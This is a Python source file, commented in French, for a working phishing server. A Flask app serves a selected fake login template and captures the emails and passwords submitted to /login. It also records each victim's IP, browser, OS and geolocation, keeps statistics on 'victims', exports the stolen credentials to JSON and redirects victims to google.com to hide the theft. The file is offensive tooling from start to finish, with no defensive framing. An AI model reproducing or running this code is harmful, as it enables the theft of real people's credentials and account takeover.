#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🎣 PHISHING CORE - Module Principal
Fonctionnalités de base pour le phishing avancé
"""

import os
import json
import time
import threading
from datetime import datetime
from flask import Flask, request, redirect, render_template_string
import requests
from user_agents import parse
import geocoder

class PhishingCore:
    def __init__(self):
        self.app = Flask(__name__)
        self.app.secret_key = 'phishing_secret_key_2024'
        
        # Variables principales
        self.server_running = False
        self.server_thread = None
        self.selected_template = None
        self.credentials = []
        self.stats = {
            'total_victims': 0,
            'successful_attacks': 0,
            'captured_credentials': 0,
            'templates_used': {},
            'geographic_data': {}
        }
        
        # Configuration
        self.host = "0.0.0.0"
        self.port = 8080
        
        # Setup routes
        self.setup_routes()
        
    def setup_routes(self):
        """Configure les routes Flask"""
        @self.app.route('/')
        def index():
            if self.selected_template and os.path.exists(self.selected_template):
                with open(self.selected_template, 'r', encoding='utf-8') as f:
                    content = f.read()
                return content
            return "Template non sélectionné"
            
        @self.app.route('/login', methods=['POST'])
        def login():
            email = request.form.get('email') or request.form.get('username')
            password = request.form.get('password')
            ip_address = request.remote_addr
            
            # Collecter les informations
            user_agent = request.headers.get('User-Agent', '')
            ua = parse(user_agent)
            
            victim_info = {
                'email': email,
                'password': password,
                'ip_address': ip_address,
                'browser': ua.browser.family,
                'os': ua.os.family,
                'timestamp': datetime.now().isoformat(),
                'user_agent': user_agent
            }
            
            # Géolocalisation
            try:
                g = geocoder.ip(ip_address)
                if g.ok:
                    victim_info['location'] = {
                        'city': g.city,
                        'country': g.country,
                        'lat': g.lat,
                        'lng': g.lng
                    }
            except:
                pass
            
            # Ajouter les credentials
            self.add_credential(victim_info)
            
            # Rediriger vers le vrai site
            return redirect("https://google.com")
            
    def add_credential(self, victim_info):
        """Ajoute une victime"""
        self.credentials.append(victim_info)
        self.stats['total_victims'] += 1
        self.stats['successful_attacks'] += 1
        self.stats['captured_credentials'] += 1
        
        # Stats par template
        template_name = os.path.basename(self.selected_template) if self.selected_template else 'unknown'
        if template_name not in self.stats['templates_used']:
            self.stats['templates_used'][template_name] = 0
        self.stats['templates_used'][template_name] += 1
        
        # Stats géographiques
        if 'location' in victim_info:
            country = victim_info['location'].get('country', 'Unknown')
            if country not in self.stats['geographic_data']:
                self.stats['geographic_data'][country] = 0
            self.stats['geographic_data'][country] += 1
            
        print(f"🎯 VICTIME CAPTURÉE: {victim_info['email']} | {victim_info['ip_address']}")
        
    def start_server(self, host=None, port=None):
        """Démarre le serveur"""
        if host:
            self.host = host
        if port:
            self.port = port
            
        if not self.server_running:
            self.server_thread = threading.Thread(target=self._run_server)
            self.server_thread.daemon = True
            self.server_thread.start()
            self.server_running = True
            print(f"🚀 Serveur démarré sur http://{self.host}:{self.port}")
            
    def stop_server(self):
        """Arrête le serveur"""
        self.server_running = False
        print("⏹️ Serveur arrêté")
        
    def _run_server(self):
        """Exécute le serveur Flask"""
        try:
            self.app.run(host=self.host, port=self.port, debug=False)
        except Exception as e:
            print(f"❌ Erreur serveur: {e}")
            
    def set_template(self, template_path):
        """Définit le template à utiliser"""
        if os.path.exists(template_path):
            self.selected_template = template_path
            print(f"✅ Template sélectionné: {template_path}")
        else:
            print(f"❌ Template non trouvé: {template_path}")
            
    def get_stats(self):
        """Retourne les statistiques"""
        return self.stats
        
    def get_credentials(self):
        """Retourne les credentials capturés"""
        return self.credentials
        
    def export_credentials(self, filename):
        """Exporte les credentials"""
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.credentials, f, indent=2, ensure_ascii=False)
            print(f"📤 Credentials exportés vers {filename}")
        except Exception as e:
            print(f"❌ Erreur export: {e}") 